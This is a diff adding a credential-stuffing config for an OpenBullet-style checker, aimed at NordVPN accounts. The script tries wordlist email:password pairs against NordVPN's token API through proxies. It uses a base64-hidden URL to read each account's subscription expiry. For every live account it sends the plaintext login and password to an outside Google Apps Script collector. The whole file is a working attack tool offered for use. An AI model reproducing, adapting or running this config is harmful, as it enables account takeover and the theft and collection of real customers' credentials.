@@ -1,0 +1,140 @@
+[SETTINGS]
+{
+  "Name": "NordVpn.com AVL",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-08-01T14:01:20.6946539+07:00",
+  "AdditionalInfo": "https://www.facebook.com/groups/pitvn/",
+  "RequiredPlugins": [],
+  "Author": "AnthonyVL",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "NordVpn",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#POST REQUEST POST "https://zwyr157wwiu6eior.com/v1/users/tokens" 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 51" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Host: zwyr157wwiu6eior.com" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "\"Unauthorized\"" 
+    KEY "Invalid username" 
+    KEY "\"code\":100102" 
+    KEY "Invalid password" 
+  KEYCHAIN Success OR 
+    KEY "\"token\"" 
+  KEYCHAIN Ban OR 
+    KEY "429 Too Many Requests" 
+
+#TOKEN PARSE "<SOURCE>" LR "\"token\":\"" "\"" -> VAR "TOKEN" 
+
+#TOKENS FUNCTION Base64Encode "token:<TOKEN>" -> VAR "TOKENS" 
+
+#get2 FUNCTION Base64Decode "aHR0cHM6Ly96d3lyMTU3d3dpdTZlaW9yLmNvbS92MS91c2Vycy9zZXJ2aWNlcw==" -> VAR "get2" 
+
+#GET_CAP REQUEST GET "<get2>" 
+  
+  HEADER "User-Agent: NordApp iOS (applestore/5.0.5) iOS/13.3.1" 
+  HEADER "Authorization: Basic <TOKENS>" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<SOURCE>" EqualTo "[]" 
+  KEYCHAIN Success OR 
+    KEY "\"expires_at\":\"" 
+
+#expires_at PARSE "<SOURCE>" JSON "expires_at" CreateEmpty=FALSE -> VAR "expires_at" 
+
+#ExpiryDate FUNCTION Split " " 1 "<expires_at>" -> VAR "ExpiryDate" 
+
+#name PARSE "<SOURCE>" JSON "name" CreateEmpty=FALSE -> VAR "name" 
+
+#RemainingDay FUNCTION GetRemainingDay "<expires_at>" -> VAR "RemainingDay" 
+
+#ConfigName FUNCTION Constant "NordVpn" -> VAR "ConfigName" 
+
+#Author FUNCTION Constant "AnthonyVL" -> VAR "Author" 
+
+#NowDate FUNCTION CurrentDate -> VAR "a" 
+
+#NowTime FUNCTION CurrentTime -> VAR "b" 
+
+#HitTime FUNCTION Constant "<a> <b>" -> VAR "HitTime" 
+
+#msg FUNCTION Constant "<ConfigName> | <USER>:<PASS> | ExpiryDate: <ExpiryDate> | RemainingDay: <RemainingDay>" -> CAP "msg" 
+
+KEYCHECK 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<RemainingDay>" LessThan "0" 
+  KEYCHAIN Success OR 
+    KEY "<RemainingDay>" GreaterOrEqual "0" 
+
+IF "<RemainingDay>" GreaterOrEqual "0"
+
+#s2 REQUEST GET "https://script.google.com/macros/s/AKfycbzsiFNvRBenVbn8U5DX34A2AmWlvw5rXkl1SpXhn7OpIgneGhdrCApM3PvNimgwGy34/exec?action=create&TYPE=<ConfigName>&LOGIN=<USER>:<PASS>&CAPTURE=<msg>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+ENDIF
+
